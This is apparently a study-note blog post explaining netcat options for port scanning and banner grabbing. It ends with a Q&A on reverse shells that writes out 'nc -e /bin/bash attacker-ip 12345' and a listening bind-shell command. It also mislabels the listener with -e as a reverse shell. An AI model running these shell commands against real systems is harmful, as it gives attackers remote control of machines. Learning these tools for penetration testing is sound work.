---
title: "Port Scanning-Netcat"
datePublished: Thu Mar 06 2025 15:13:21 GMT+0000 (Coordinated Universal Time)
cuid: cm7xhkya3000009lbdri7e8kz
slug: port-scanning-netcat
tags: reconnaissance, port-scanning, active-scanning

---

**Netcat** (often abbreviated as **nc**) is a **network utility** used for reading from and writing to network connections using **TCP** or **UDP** protocols. It is often referred to as the "**Swiss Army knife**" of networking because of its versatility. Netcat can be used for various tasks, such as:

* **Port scanning**: Checking for open ports on a target system.
    
* **Banner grabbing**: Retrieving information about a service running on a port.
    
* **Data transfer**: Sending and receiving files over a network.
    
* **Creating reverse shells**: Enabling remote access to a system for penetration testing.
    

| **Option** | **Command Example** | **Description** |
| --- | --- | --- |
| `-l` | `nc -l -p 1234` | Listen on the specified port (e.g., **1234**) for incoming connections. |
| `-p` | `nc -l -p 1234` | Specify the port number to listen on (used with `-l`). |
| `-v` | `nc -v target-ip 80` | **Verbose mode** – Show detailed connection information. |
| `-w` | `nc -w 3 target-ip 80` | Set a **timeout** (in seconds) for the connection. |
| `-u` | `nc -u target-ip 12345` | Use **UDP** instead of the default TCP for the connection. |
| `-z` | `nc -z target-ip 1-100` | **Zero-I/O mode** – Scan ports without sending/receiving data. |
| `-n` | `nc -n -v target-ip 80` | Use **numeric-only IP addresses** (no DNS resolution). |
| `-e` | `nc -l -p 1234 -e /bin/bash` | Execute a program upon a successful connection (often used for reverse shells). |
| `-c` | `nc -l -p 1234 -c 'echo hello'` | Execute a **command** after a connection is established. |
| `-k` | `nc -l -p 1234 -k` | Keep **listening** after the connection is closed. |
| `-i` | `nc -i 5 target-ip 1234` | Set **intervals** (in seconds) between each data transmission. |

### **Common Netcat (**`nc`) Options

1. `-l`: **Listening mode** – Make Netcat listen for incoming connections on the specified port.
    
    ```bash
    nc -l -p 1234
    ```
    
    *Explanation*: This command makes Netcat listen on port **1234** for incoming connections.
    
2. `-p`: **Port** – Specify the port number for listening or connecting.
    
    ```bash
    nc -l -p 1234
    ```
    
    *Explanation*: Used with `-l` to specify the port Netcat listens on (in this case, port 1234).
    
3. `-v`: **Verbose** – Provides more detailed output for the connection.
    
    ```bash
    nc -v target-ip 80
    ```
    
    *Explanation*: This command gives detailed output when connecting to **target-ip** on port 80.
    
4. `-w`: **Timeout** – Set a timeout (in seconds) for the connection attempt.
    
    ```bash
    nc -w 3 target-ip 80
    ```
    
    *Explanation*: This command attempts to connect to **target-ip** on port 80, and if the connection takes more than 3 seconds, it will timeout.
    
5. `-u`: **UDP** – Use **UDP** instead of the default **TCP** for the connection.
    
    ```bash
    nc -u target-ip 12345
    ```
    
    *Explanation*: This command will use **UDP** to connect to **target-ip** on port 12345.
    
6. `-z`: **Zero-I/O mode** – Scan for open ports without sending or receiving data. This is useful for port scanning.
    
    ```bash
    nc -z target-ip 1-100
    ```
    
    *Explanation*: This will check ports **1 to 100** on **target-ip** without sending any data.
    
7. `-n`: **Numeric-only IP addresses** – Do not perform DNS lookup on hostnames. Only IP addresses will be used.
    
    ```bash
    nc -n -v target-ip 80
    ```
    
    *Explanation*: This command connects to the IP address **target-ip** on port 80, without performing DNS resolution.
    
8. `-e`: **Execute a program** – Execute a specified program after a connection is established (often used for reverse shells).
    
    ```bash
    nc -l -p 1234 -e /bin/bash
    ```
    
    *Explanation*: When a connection is made to port 1234, Netcat will execute `/bin/bash` (a shell), effectively creating a **reverse shell**.
    
9. `-c`: **Command** – Run a command after connecting.
    
    ```bash
    nc -l -p 1234 -c 'echo hello'
    ```
    
    *Explanation*: This command executes `echo hello` after the connection is made to port 1234.
    
10. `-k`: **Keep listening** – Keep listening for multiple incoming connections instead of exiting after one connection is closed.
    

```bash
nc -l -p 1234 -k
```

*Explanation*: This allows **Netcat** to keep listening on port **1234** for multiple incoming connections instead of stopping after a single connection.

11. `-i`: **Interval** – Specify the interval between sending data. This option is used to set the time delay between each line of output when sending data.
    

```bash
nc -i 5 target-ip 1234
```

*Explanation*: This command will wait 5 seconds between sending each packet to **target-ip** on port 1234.

### **Question**:

Wait, so the other `nc -` is executed on the attacker’s computer, and `nc -e` is executed on the victim's computer?

### **Answer**:

Yes, that's correct! Here's the explanation

### 1\. `nc -l` (Executed on the Attacker's System)

The command `nc -l` is executed on the attacker's system to wait for a connection from the target system. The `-l` option sets Netcat to listening mode, allowing it to wait for incoming connections on a specified port.

#### Attacker's System (Waiting for a Reverse Shell Connection):

```bash
nc -l -p 12345
```

* `-l`: Listening mode (waiting for a connection).
    
* `-p 12345`: Listening on port **12345**.
    

By running this command, the attacker’s system waits for the target system to connect. Once a connection is established, the attacker gains remote shell access to the target.

---

### 2\. `nc -e` (Executed on the Target System)

The command `nc -e` is executed on the target system to establish a connection to the attacker's system. The `-e` option executes the specified command (e.g., `/bin/bash`) upon connection, effectively providing a reverse shell.

#### Target System (Initiating a Reverse Shell):

```bash
nc -e /bin/bash attacker-ip 12345
```

* `-e /bin/bash`: Executes `/bin/bash` upon connection, granting the attacker remote control over the shell.
    
* `attacker-ip`: The IP address of the attacker's system.
    
* `12345`: The port number where the attacker is listening.
    

When the target system executes this command, it connects to the attacker's system on port **12345** and provides a shell, allowing the attacker to execute commands remotely.

---

### Summary

* `nc -l` is used on the **attacker's system** in listening mode to wait for an incoming connection.
    
* `nc -e` is used on the **target system** to establish a connection to the attacker and provide a reverse shell.
    

Thus, `nc -l` runs on the attacker's system, while `nc -e` runs on the victim's system to initiate a reverse shell.